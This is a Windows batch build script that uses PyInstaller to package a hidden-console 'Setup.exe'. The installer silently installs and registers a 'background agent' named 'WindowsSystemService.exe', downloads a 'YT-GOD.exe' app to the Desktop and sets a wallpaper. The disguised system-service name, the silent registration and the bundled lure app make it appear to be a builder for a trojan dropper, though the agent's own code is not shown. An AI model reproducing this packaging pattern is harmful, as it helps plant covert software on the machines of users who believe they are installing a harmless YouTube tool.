@echo off
title Building Installer...
echo.
echo ============================================
echo   Building Full Installer
echo   Bundles: Agent + YT-GOD + Wallpaper
echo ============================================
echo.

if not exist "WindowsSystemService.exe" (
    echo ERROR: WindowsSystemService.exe not found! Run build.bat first.
    pause & exit /b 1
)
echo NOTE: YT-GOD.exe will be downloaded from R2 at install time. No local file needed.

echo [1/3] Installing pyinstaller...
pip install pyinstaller --quiet

echo [2/3] Building Setup.exe with all files bundled...
pyinstaller ^
    --onefile ^
    --noconsole ^
    --name "Setup" ^
    --add-data "WindowsSystemService.exe;." ^
    deploy.py

echo [3/3] Finalizing...
copy /Y "dist\Setup.exe" "Setup.exe" >nul
rmdir /s /q build >nul 2>&1
rmdir /s /q dist  >nul 2>&1
del /q "Setup.spec" >nul 2>&1

echo.
echo ============================================
echo   DONE! Setup.exe bundles:
echo     WindowsSystemService.exe  (background agent)
echo     YT-GOD.exe                (downloaded from R2 at install time)
echo   On install:
echo     Agent silently installed + registered
echo     Wallpaper downloaded + set
echo     YT-GOD.exe placed on Desktop
echo ============================================
pause
